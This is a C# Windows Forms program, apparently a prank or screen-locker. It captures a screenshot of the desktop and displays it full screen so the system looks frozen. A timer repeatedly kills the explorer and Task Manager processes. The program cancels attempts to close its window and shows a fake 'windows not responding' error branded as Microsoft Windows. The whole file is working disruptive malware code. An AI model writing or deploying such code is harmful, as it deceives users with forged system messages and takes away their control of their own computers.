using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
namespace AppShow
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.Hide();
            Bitmap bm = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics gp = Graphics.FromImage(bm);
            gp.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
            pictureBox1.Image = bm;
            this.Show();
        }

        Process[] pc;
        private void timer1_Tick(object sender, EventArgs e)
        {
            pc = Process.GetProcesses();
            foreach(Process p in pc)
            {
                if((p.ProcessName == "explorer") ||( p.ProcessName == "taskmgr"))
                {
                    p.Kill();
                }

            }

        }

        private void Form1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("windows not responding", "Microsoft Windows", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            MessageBox.Show("windows not responding", "Microsoft Windows", MessageBoxButtons.OK, MessageBoxIcon.Error);

        }
    }
}
